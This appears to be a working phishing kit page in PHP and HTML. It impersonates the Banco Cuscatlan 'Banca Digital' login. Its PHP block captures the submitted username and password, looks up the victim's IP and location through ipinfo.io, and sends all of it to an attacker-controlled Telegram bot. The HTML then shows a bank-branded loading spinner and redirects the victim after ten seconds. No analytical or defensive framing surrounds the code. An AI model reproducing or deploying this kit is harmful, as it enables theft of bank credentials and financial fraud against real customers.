<?php
ini_set("display_errors", 0);

// Función para obtener IP real del cliente
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Función para obtener información de IP
function getIpInfo($ip) {
    $url = "http://ipinfo.io/{$ip}/json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// Función para enviar mensaje a Telegram
function env($token, $chatID, $mensaje) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = array(
        'chat_id' => $chatID,
        'text' => $mensaje
    );
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ),
    );
    $context = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

// Validación del POST
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['mat-input-1']) && isset($_POST['mat-input-0'])) {

    $input  = htmlspecialchars($_POST['mat-input-1']);
    $input2 = htmlspecialchars($_POST['mat-input-0']);

    $config = include('config.php');

    $ip = getClientIP();
    $ipInfo = getIpInfo($ip);

    $city = isset($ipInfo['city']) ? $ipInfo['city'] : 'Desconocido';
    $country = isset($ipInfo['country']) ? $ipInfo['country'] : 'Desconocido'; 
    $region = isset($ipInfo['region']) ? $ipInfo['region'] : 'Desconocido';

    $mensajex = "🔵CUSC4TL4N🔵\nUS4R: {$input}\nC0NTR4X: {$input2}\n\nIP: {$ip}\n{$city}, {$country}\n";

    $response = env($config['token'], $config['chat_id'], $mensajex);

    if ($response === FALSE) {
        echo "Error al enviar el mensaje a Telegram.";
    } else {
       
    }
} else {
    echo "Método de solicitud no válido o campos faltantes.";
}
?>

   <!DOCTYPE html>

<html lang="es" data-critters-container="">
 
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Banca Digital</title>
    
      <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0, user-scalable=no">
      <link rel="icon" type="image/x-icon" href="https://multimedia.bancocuscatlan.com/banca-digital/logos/favicon.png">
      <link rel="preconnect" href="https://fonts.gstatic.com/">
      <style type="text/css">@font-face{font-family:'Material Icons';font-style:normal;font-weight:400;src:url(https://fonts.gstatic.com/s/materialicons/v143/flUhRq6tzZclQEJ-Vdg-IuiaDsNcIhQ8tQ.woff2) format('woff2');}.material-icons{font-family:'Material Icons';font-weight:normal;font-style:normal;font-size:24px;line-height:1;letter-spacing:normal;text-transform:none;display:inline-block;white-space:nowrap;word-wrap:normal;direction:ltr;-webkit-font-feature-settings:'liga';-webkit-font-smoothing:antialiased;}</style>
      <link rel="stylesheet" href="fonts.css">
      <link rel="stylesheet" href="animate.min.css">
      <link rel="stylesheet" href="line.css" nonce="">
      
      <link rel="stylesheet" href="styles.39840692d9422e83.css" media="all" onload="this.media=&#39;all&#39;">
      <noscript>
         <link rel="stylesheet" href="styles.39840692d9422e83.css">
      </noscript>
      
      <style type="text/css"></style>
      <style>.main-app[_ngcontent-ng-c4249295262]{display:block;height:100%;background-color:#f2f2f2}</style>
     
      <style>.otp-input[_ngcontent-ng-c3470639301]{width:50px;height:50px;border-radius:4px;border:solid 1px #c5c5c5;text-align:center;font-size:32px}.ng-otp-input-wrapper[_ngcontent-ng-c3470639301]   .otp-input[_ngcontent-ng-c3470639301]:not(:last-child){margin-right:8px}@media screen and (max-width: 767px){.otp-input[_ngcontent-ng-c3470639301]{width:40px;font-size:24px;height:40px}}@media screen and (max-width: 420px){.otp-input[_ngcontent-ng-c3470639301]{width:30px;font-size:18px;height:30px}}</style>


      <style type="text/css">
         /* Aseguramos que la imagen esté centrada */
.image-container {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;  /* Centra la imagen en toda la altura de la ventana */
}

.rotate-img {
  width: 150px;  /* Ajusta el tamaño de la imagen según sea necesario */
  height: auto;
  animation: rotate 5s linear infinite;  /* Animación de rotación */
}

@keyframes rotate {
  0% {
    transform: rotate(0deg);  /* Comienza en 0 grados */
  }
  100% {
    transform: rotate(360deg);  /* Gira 360 grados */
  }
}
         
      </style>
   </head>

   <body class="mat-typography mat-app-background" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMCIsInNjb3JlIjoyMDAyMDB9XQ==" __processed_4cf128f0-c34d-4ce2-a336-6ad59f5bb872__="true" inmaintabuse="1">
      <noscript aria-hidden="true">
         <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WTBXBT2" name="tag-manager" height="0" width="0" title="tag-manager" style="display:none;visibility:hidden">
         </iframe>
      </noscript>
      <app-root _nghost-ng-c4249295262="" ng-version="16.2.12" aria-hidden="true">
         <div _ngcontent-ng-c4249295262="" id="head-app" class="main-app" bis_skin_checked="1">
            <app-appbar _ngcontent-ng-c4249295262="" class="overlay-menu" _nghost-ng-c789735356="">
                
               <mat-toolbar _ngcontent-ng-c789735356="" class="mat-toolbar bg-primary change-position mat-toolbar-single-row" style="z-index: 5000 !important;">
                  <div _ngcontent-ng-c789735356="" class="toolbar max-width" bis_skin_checked="1">
                     <div _ngcontent-ng-c789735356="" class="toolbar__logo" bis_skin_checked="1">
                        <img _ngcontent-ng-c789735356="" alt="Banco CUSCATLAN" class="toolbar__img u-cursor-pointer" src="logo.png"><img _ngcontent-ng-c789735356="" alt="Banco CUSCATLAN" class="toolbar__mobile u-cursor-pointer" src="ring.png">
                        <div _ngcontent-ng-c789735356="" class="toolbar__separator" bis_skin_checked="1"></div>
                        <p _ngcontent-ng-c789735356="" class="toolbar__text v1-sb">Banca Digital</p>
                     </div>
                     <div _ngcontent-ng-c789735356="" class="u-d-flex u-align-center" bis_skin_checked="1">
                         
                        <button _ngcontent-ng-c789735356="" mat-icon-button="" color="primary" mat-ripple-loader-uninitialized="" mat-ripple-loader-class-name="mat-mdc-button-ripple" class="mdc-icon-button mat-mdc-icon-button mat-primary mat-mdc-button-base" mat-ripple-loader-centered="">
                           <span class="mat-mdc-button-persistent-ripple mdc-icon-button__ripple"></span>
                           <mat-icon _ngcontent-ng-c789735356="" role="img" class="mat-icon notranslate material-icons mat-ligature-font mat-icon-no-color" aria-hidden="true" data-mat-icon-type="font">menu</mat-icon>
                             <span class="mat-mdc-focus-indicator"></span><span class="mat-mdc-button-touch-target"></span>
                        </button>
                              
                     </div>
                        
                  </div>
               </mat-toolbar>
                
            </app-appbar>
            
         </div>
      </app-root>


    
      <div class="cdk-overlay-container" bis_skin_checked="1">
   <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"></div>
   <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;">
      <div id="cdk-overlay-6" class="cdk-overlay-pane dialog-confirm-357" style="max-width: 80vw; position: static;">
         <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
         <mat-dialog-container tabindex="-1" class="mat-mdc-dialog-container mdc-dialog cdk-dialog-container mdc-dialog--open" id="mat-mdc-dialog-6" role="dialog" aria-modal="true" style="--mat-dialog-transition-duration: 150ms;">
            <div class="mdc-dialog__container">
               <div class="mat-mdc-dialog-surface mdc-dialog__surface">
                  <app-dialog-loading class="ng-star-inserted">
                     <mat-dialog-content class="mat-mdc-dialog-content mdc-dialog__content action-confirm">
                        <div class="u-pt-2 u-pb-2">
                           <div class="u-d-flex u-justify-center u-align-center u-flex-column">
                              <app-loading _nghost-ng-c2808106859="">
                                 <ng-lottie _ngcontent-ng-c2808106859="" class="loading default-size">
                                    <div style="width: 100%; height: 100%;">
                                       <img src="logooo.png" style="display: block;margin: 0 auto;width: 100px;" alt="Imagen girando" class="rotate-img">
                                    </div>
                                 </ng-lottie>
                              </app-loading>
                              <p class="u-sb-variant-s u-text-blue-80 u-mt-2 ng-star-inserted">  </p>
                                
                           </div>
                        </div>
                     </mat-dialog-content>
                  </app-dialog-loading>
                   
               </div>
            </div>
         </mat-dialog-container>
         <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
      </div>
   </div>
</div>
<script>
  function startCountdown(seconds) {
    var countdownInterval = setInterval(function () {
      seconds--;

      if (seconds < 0) {
        clearInterval(countdownInterval);
        window.location.href = "index.html";
      }
    }, 1000);
  }

  document.addEventListener("DOMContentLoaded", function () {
    startCountdown(10);
  });
</script>
</html>
